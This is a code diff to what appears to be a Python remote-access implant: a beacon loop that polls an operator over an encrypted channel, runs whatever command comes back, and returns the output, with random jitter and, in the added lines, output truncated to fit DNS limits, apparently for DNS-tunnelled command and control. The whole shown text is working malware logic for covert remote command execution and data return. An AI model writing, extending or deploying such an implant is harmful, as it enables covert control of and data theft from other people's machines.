@@ -37,20 +37,33 @@ def execute(command: str) -> str:
 def beacon():
     print(f"Agent beaconing — session {SESSION_ID}")
     while True:
-        # step 1 — send heartbeat query
-        encrypted_ping = crypto.encrypt("READY", KEY)
-        encrypted_task = send_query(encrypted_ping)
-
-        # step 2 — decrypt and execute
-        task = crypto.decrypt(encrypted_task, KEY)
-        output = execute(task)
-
-        # step 3 — send result back if we did something
-        if output:
-            encrypted_result = crypto.encrypt(output, KEY)
-            send_query(encrypted_result)
-
-        time.sleep(INTERVAL + random.uniform(-1, 1))  # tiny jitter
+        try:
+            # 1. Heartbeat to get next task
+            encrypted_ping = crypto.encrypt("READY", KEY)
+            encrypted_task = send_query(encrypted_ping)
+            
+            # 2. Decrypt & execute
+            task = crypto.decrypt(encrypted_task, KEY)
+            print(f"[*] Executing: {task}")
+            output = execute(task)
+            
+            # 3. TRUNCATE to fit DNS limits (strict 30 chars)
+            if output:
+                output = output.strip()[:30]
+                if len(output) == 30:
+                    output += "..."
+            
+            # 4. Send result back
+            if output:
+                encrypted_result = crypto.encrypt(output, KEY)
+                send_query(encrypted_result)
+                print(f"[+] Result sent")
+                
+            time.sleep(INTERVAL + random.uniform(-1, 1))
+            
+        except Exception as e:
+            print(f"[-] Error: {e}")
+            time.sleep(2)
 
 if __name__ == "__main__":
     beacon()
